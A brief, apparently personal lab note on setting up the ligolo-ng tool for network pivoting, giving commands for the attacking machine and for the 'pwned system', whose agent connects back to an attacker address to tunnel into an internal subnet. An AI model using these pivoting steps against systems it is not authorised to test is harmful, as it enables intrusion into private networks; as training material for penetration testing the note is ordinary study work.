command to setup ligolo-ng

first run there on the attacking machine(our vm):
`ip tuntap add user root mode tun ligolo`
`ip link set ligolo up`

then

`./proxy -selfcert`

PWNED SYSTEM COMMANDS:

`./agent -ignore-cert -connect 10.10.14.16:11601`

now we have to add route on our attack host:

`ip route add 192.168.148.0/24 dev ligolo`
`ip route list`

start tunnel in ligolo by typing start 
type "start" in ligolo to start tunnel

we are done with single pivoting

